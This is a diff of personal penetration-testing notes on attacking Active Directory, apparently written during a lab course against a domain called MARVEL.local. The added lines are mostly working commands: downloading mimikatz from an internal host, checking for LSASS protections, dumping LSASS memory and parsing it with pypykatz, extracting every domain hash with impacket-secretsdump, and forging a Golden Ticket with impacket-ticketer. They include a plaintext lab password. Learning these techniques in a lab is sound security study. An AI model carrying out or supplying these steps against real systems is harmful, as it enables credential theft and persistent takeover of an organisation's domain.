@@ -3,6 +3,8 @@ AD
 
 First step is breach (gain valid credentials for domain)
 
+set kali DNS of eth to AD DNS
+
 Techniques:
 
 LLMNR poisoning (and NBT-NS) (Legacy protocol ) | MITM
@@ -274,10 +276,67 @@ powershell -c "wget http://192.168.1.253/mimikatz.exe -OutFile mimikatz.exe"
 # wiki for help
 https://github.com/gentilkiwi/mimikatz/wiki
 mimikatz.exe
-privilege::debug #bypass memory protections
+privilege::debug #enabled SeDebugPrivilege (privilege ID 20), allowing attaching to LSASS
+# Should return OK, even if it does:
+# LSA Protection (LSASS runs as protected process) and CredentialGuard (isolated in a virtualized container outside of standard LSASS memory)
+(Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard).SecurityServicesRunning # check if cred guard is running, if 0 then not run
+reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL # check for PPL, if 0x0 then not
 sekurlsa::logonpasswords
+# if using windows 11 24h2, 25h2 and above, gentilkiwi original mimkatz fails as it lacks the proper signature, easiest solution is to use this github repo instead
+https://github.com/tanrikuluatahan/mimikatz
+# Read the link here for more info: https://medium.com/@tanrikuluatahan/fixing-mimikatz-sekurlsa-logonpasswords-on-windows-11-24h2-25h2-253e82866197
 #mimikatz x86 can't access x64 processes
+# Don't even try to compile or fix rn, tried visual studio code, msbuild, making the .sln file. It's awful
+(Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard).SecurityServicesRunning # check credential guard
+(Get-ComputerInfo).DeviceGuardSecurityServicesRunning # another credential guard check
+Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL" -ErrorAction SilentlyContinue #ANother PPL check
+[PSCustomObject]@{ RunAsPPL = (Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' -Name RunAsPPL -ErrorAction SilentlyContinue).RunAsPPL; LsaCfgFlags = (Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' -Name LsaCfgFlags -ErrorAction SilentlyContinue).LsaCfgFlags; CredentialGuardRunning = (Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard -ErrorAction SilentlyContinue).SecurityServicesRunning }
+#pypykatz allegedly works, but every mimikatz that is precompiled failed. attempted vscode to compile a "fixed" fork of mimikatz and did not compile
+wget http://192.168.1.253/mimikatz.exe -outfile mimikatz.exe
+lsassy -d <domain> -u <username> -p <password> <target_ip_or_hostname> -v
+pypykatz live lsa
+# lsassy found no credentials
+Get-ComputerInfo | Select-Object WindowsProductName, WindowsVersion, OsBuildNumber
+#pypykatz 0.6.13 failed as well
+# Use task manager as adming, find lsass.exe process, right click and create memory dump. Then use pypykatz on it to decipher it
+python3 -m pypykatz lsa minidump C:\Users\Administrator\Downloads\lsass.DMP
+# You can download pypykatz on windows
+# Mimikatz on Server 2025: sekurlsa blocked by tool/OS version mismatch (not PPL, not CredGuard—both confirmed off). Manual LSASS dump via Task Manager + pypykatz worked. Dump yields msv NT hashes + kerberos tickets; no krbtgt (that's NTDS.dit, needs DCSync). Golden Ticket path: DA → secretsdump -just-dc-user krbtgt → forge TGT → prove. Note: Task Manager dump is quieter than Mimikatz (LOLBAS-adjacent).
+Output parsing:
+msv = username, domain, hash, NTLM, PtH
+kerberos = TGT/TGS + session key. Export file, PtT
+wdigest = disabled since win 2012/win8, plaintext pw, unlikely
+tspkg, credman, ssp = supplementary; often empty in a lab.
+#krbtgt hash is in NTDS.dit
+# mimikatz can turn on wdigest for someone to logon to computer and grab their plaintext # CAREFUL growing attack surface!
+# If credential guard and PPL, mimikatz can (sekurlsa::memssp) to capture credentials live
+##lsadump::sam
+##token::elevate
+##lsadump::lsa /patch
+##All mimikatz failed
+# try mass dump passwords, and find percentage crackable, to improve password policy
 
+impacket-secretsdump MARVEL.local/Administrator:'P@$$w0rd!123'@192.168.1.10 -outputfile full_ad_dump #Needs Admin, extracts EVERY hash in the domain
+nano full_ad_dump.ntds # This file = digital gold
+#offline?
+secretdump.py -ntds ntds.dit -system SYSTEM LOCAL
+
+
+Golden Ticket attack + Pass the Ticket PtT
+impacket-secretsdump MARVEL.local/Administrator:'P@$$w0rd!123'@192.168.1.10 -outputfile full_ad_dump # GET KRBTGT HASH!
+impacket-lookupsid marvel.local/administrator:'P@$$w0rd!123'@192.168.1.10 # GET DOMAIN SID
+#ATTACK!
+impacket-ticketer -nthash <KRBTGT_NT_HASH> -domain-sid <DOMAIN_SID> -domain marvel.local Administrator
+#uses dcsync
+export KRB5CCNAME=Administrator.ccache
+#can forge ticket for any user, as long as they exist
+#Persistence
+dir \\DC01\C$ #prove total domain control
+
+#can you kerberoast tgt??? why not? Hmm... SPN? 
+
+
+# TODO: Note: Windows credential materials to learn
 
 # TO DO TEST LATER:
 # It seems it doesn't auto open as it's not trusted, perhaps changing the domain (used blah domain because of TCM) or making it a trusted zone can make attack more dangerous?
